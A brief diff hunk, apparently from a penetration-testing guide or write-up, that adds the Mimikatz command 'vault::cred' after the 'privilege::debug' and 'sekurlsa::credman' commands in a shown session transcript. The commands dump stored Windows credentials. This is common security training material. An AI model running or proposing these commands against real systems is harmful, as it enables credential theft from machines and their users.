@@ -914,6 +914,7 @@ mimikatz # privilege::debug
 Privilege '20' OK
 
 mimikatz # sekurlsa::credman
+mimikatz # vault::cred
 
 ...SNIP...
 
